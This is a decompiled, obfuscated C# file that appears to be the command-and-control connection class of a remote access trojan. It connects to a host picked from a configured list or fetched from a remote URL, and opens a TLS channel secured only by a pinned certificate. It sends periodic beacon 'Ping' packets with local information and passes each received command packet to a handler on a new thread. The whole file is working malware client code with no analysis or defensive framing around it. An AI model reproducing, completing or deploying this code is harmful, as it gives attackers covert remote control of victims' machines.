using System;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using FLyjDGiQaWOL;
using MlfWmjHrDtM;
using TSsgkAiksqQbUk;
using gDUxSbRqUN;

namespace gxNMEqEgrijT;

public static class MtisDSJUpyiKPK
{
	public static Socket cKOKdPgbhQLCp { get; set; }

	public static SslStream GehiQWzjIEIk { get; set; }

	private static byte[] cvhorhlizOd { get; set; }

	private static long EgIGKGkaBzL { get; set; }

	private static long hcgOfgQWRggQv { get; set; }

	private static Timer SZiRfCFETJaKwR { get; set; }

	public static bool YYgNbzehGgeDmhrRj { get; set; }

	private static object YcsiVDoorWPMDc { get; }

	private static Timer RUYkeiGocqEPRD { get; set; }

	public static int DpnekLZsFtZQc { get; set; }

	public static bool SfBRntbYErncrmc { get; set; }

	public static void DTTWkuoHAgkn()
	{
		try
		{
			cKOKdPgbhQLCp = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
			{
				ReceiveBufferSize = 51200,
				SendBufferSize = 51200
			};
			if (slKZMvijUhIUq.fwPxvYZvAu == "null")
			{
				string text = slKZMvijUhIUq.FqTIPmnQdgBAVIK.Split(new char[1] { ',' })[new Random().Next(slKZMvijUhIUq.FqTIPmnQdgBAVIK.Split(new char[1] { ',' }).Length)];
				int port = Convert.ToInt32(slKZMvijUhIUq.QnwIlCxmZwuVh.Split(new char[1] { ',' })[new Random().Next(slKZMvijUhIUq.QnwIlCxmZwuVh.Split(new char[1] { ',' }).Length)]);
				if (LyYSbQEPXpuaV(text))
				{
					IPAddress[] hostAddresses = Dns.GetHostAddresses(text);
					foreach (IPAddress address in hostAddresses)
					{
						try
						{
							cKOKdPgbhQLCp.Connect(address, port);
							if (cKOKdPgbhQLCp.Connected)
							{
								break;
							}
						}
						catch
						{
						}
					}
				}
				else
				{
					cKOKdPgbhQLCp.Connect(text, port);
				}
			}
			else
			{
				using WebClient webClient = new WebClient();
				NetworkCredential networkCredential = (NetworkCredential)(webClient.Credentials = new NetworkCredential("", ""));
				string[] array = webClient.DownloadString(slKZMvijUhIUq.fwPxvYZvAu).Split(new string[1] { ":" }, StringSplitOptions.None);
				slKZMvijUhIUq.FqTIPmnQdgBAVIK = array[0];
				slKZMvijUhIUq.QnwIlCxmZwuVh = array[new Random().Next(1, array.Length)];
				cKOKdPgbhQLCp.Connect(slKZMvijUhIUq.FqTIPmnQdgBAVIK, Convert.ToInt32(slKZMvijUhIUq.QnwIlCxmZwuVh));
			}
			if (cKOKdPgbhQLCp.Connected)
			{
				YYgNbzehGgeDmhrRj = true;
				GehiQWzjIEIk = new SslStream(new NetworkStream(cKOKdPgbhQLCp, ownsSocket: true), leaveInnerStreamOpen: false, qPNaUxQZuFvs);
				GehiQWzjIEIk.AuthenticateAsClient(cKOKdPgbhQLCp.RemoteEndPoint!.ToString()!.Split(new char[1] { ':' })[0], null, SslProtocols.Tls, checkCertificateRevocation: false);
				EgIGKGkaBzL = 4L;
				cvhorhlizOd = new byte[EgIGKGkaBzL];
				hcgOfgQWRggQv = 0L;
				wWjqfBHTJauC(lWQQXQrLBQgaqZs.bvzkrhtFwuvD());
				DpnekLZsFtZQc = 0;
				SfBRntbYErncrmc = false;
				SZiRfCFETJaKwR = new Timer(NDFmxRVgLFWQ, null, new Random().Next(10000, 15000), new Random().Next(10000, 15000));
				RUYkeiGocqEPRD = new Timer(acjFiKOGVOvFBvZR, null, 1, 1);
				GehiQWzjIEIk.BeginRead(cvhorhlizOd, (int)hcgOfgQWRggQv, (int)EgIGKGkaBzL, kRKsSlVfxDNkQ, null);
			}
			else
			{
				YYgNbzehGgeDmhrRj = false;
			}
		}
		catch
		{
			YYgNbzehGgeDmhrRj = false;
		}
	}

	private static bool LyYSbQEPXpuaV(string YeoWHnbxwLRLe)
	{
		return Uri.CheckHostName(YeoWHnbxwLRLe) != UriHostNameType.Unknown;
	}

	private static bool qPNaUxQZuFvs(object tnKpgGPghhBuAw, X509Certificate HSPctHmQFCm, X509Chain VyXjThdYUWNcyYg, SslPolicyErrors thNiCAkFwbTV)
	{
		return slKZMvijUhIUq.DxEbaqCtMcTfdYD.Equals(HSPctHmQFCm);
	}

	public static void uIpJrKfclvf()
	{
		try
		{
			GehiQWzjIEIk?.Dispose();
			cKOKdPgbhQLCp?.Dispose();
			RUYkeiGocqEPRD?.Dispose();
			SZiRfCFETJaKwR?.Dispose();
		}
		catch
		{
		}
		YYgNbzehGgeDmhrRj = false;
	}

	public static void kRKsSlVfxDNkQ(IAsyncResult dmplCTPtUHB)
	{
		try
		{
			if (cKOKdPgbhQLCp.Connected && YYgNbzehGgeDmhrRj)
			{
				int num = GehiQWzjIEIk.EndRead(dmplCTPtUHB);
				if (num > 0)
				{
					hcgOfgQWRggQv += num;
					EgIGKGkaBzL -= num;
					if (EgIGKGkaBzL == 0L)
					{
						EgIGKGkaBzL = BitConverter.ToInt32(cvhorhlizOd, 0);
						if (EgIGKGkaBzL > 0L)
						{
							hcgOfgQWRggQv = 0L;
							cvhorhlizOd = new byte[EgIGKGkaBzL];
							while (EgIGKGkaBzL > 0L)
							{
								int num2 = GehiQWzjIEIk.Read(cvhorhlizOd, (int)hcgOfgQWRggQv, (int)EgIGKGkaBzL);
								if (num2 > 0)
								{
									hcgOfgQWRggQv += num2;
									EgIGKGkaBzL -= num2;
									if (EgIGKGkaBzL < 0L)
									{
										YYgNbzehGgeDmhrRj = false;
										return;
									}
									continue;
								}
								YYgNbzehGgeDmhrRj = false;
								return;
							}
							new Thread(tXsdFYrhAJnAoTF.OtaNZkDUUNoDS).Start(cvhorhlizOd);
							hcgOfgQWRggQv = 0L;
							EgIGKGkaBzL = 4L;
							cvhorhlizOd = new byte[EgIGKGkaBzL];
						}
						else
						{
							EgIGKGkaBzL = 4L;
							cvhorhlizOd = new byte[EgIGKGkaBzL];
							hcgOfgQWRggQv = 0L;
						}
					}
					else if (EgIGKGkaBzL < 0L)
					{
						YYgNbzehGgeDmhrRj = false;
						return;
					}
					GehiQWzjIEIk.BeginRead(cvhorhlizOd, (int)hcgOfgQWRggQv, (int)EgIGKGkaBzL, kRKsSlVfxDNkQ, null);
				}
				else
				{
					YYgNbzehGgeDmhrRj = false;
				}
			}
			else
			{
				YYgNbzehGgeDmhrRj = false;
			}
		}
		catch
		{
			YYgNbzehGgeDmhrRj = false;
		}
	}

	public static void wWjqfBHTJauC(byte[] ZASZbjsCJoLZ)
	{
		lock (YcsiVDoorWPMDc)
		{
			try
			{
				if (!YYgNbzehGgeDmhrRj)
				{
					return;
				}
				byte[] bytes = BitConverter.GetBytes(ZASZbjsCJoLZ.Length);
				cKOKdPgbhQLCp.Poll(-1, SelectMode.SelectWrite);
				GehiQWzjIEIk.Write(bytes, 0, bytes.Length);
				if (ZASZbjsCJoLZ.Length > 1000000)
				{
					using (MemoryStream memoryStream = new MemoryStream(ZASZbjsCJoLZ))
					{
						int num = 0;
						memoryStream.Position = 0L;
						byte[] array = new byte[50000];
						while ((num = memoryStream.Read(array, 0, array.Length)) > 0)
						{
							cKOKdPgbhQLCp.Poll(-1, SelectMode.SelectWrite);
							GehiQWzjIEIk.Write(array, 0, num);
							GehiQWzjIEIk.Flush();
						}
						return;
					}
				}
				cKOKdPgbhQLCp.Poll(-1, SelectMode.SelectWrite);
				GehiQWzjIEIk.Write(ZASZbjsCJoLZ, 0, ZASZbjsCJoLZ.Length);
				GehiQWzjIEIk.Flush();
			}
			catch
			{
				YYgNbzehGgeDmhrRj = false;
			}
		}
	}

	public static void NDFmxRVgLFWQ(object jFRBiYldoUTHIV)
	{
		try
		{
			BkiLYFLOLaOffh bkiLYFLOLaOffh = new BkiLYFLOLaOffh();
			bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Packet").NeEjgBfTnxsVX = "Ping";
			bkiLYFLOLaOffh.bHZXfobBkouZxiwT("Message").NeEjgBfTnxsVX = gUNCcShyznD.OpTBxCuTDqyveqbmB();
			wWjqfBHTJauC(bkiLYFLOLaOffh.nBhKSGjtanPwf());
			GC.Collect();
			SfBRntbYErncrmc = true;
		}
		catch
		{
		}
	}

	private static void acjFiKOGVOvFBvZR(object LzPdtqDrpQTJEb)
	{
		try
		{
			if (SfBRntbYErncrmc && YYgNbzehGgeDmhrRj)
			{
				DpnekLZsFtZQc++;
			}
		}
		catch
		{
		}
	}

	static MtisDSJUpyiKPK()
	{
		_003CSendSync_003Ek__BackingField = new object();
	}
}
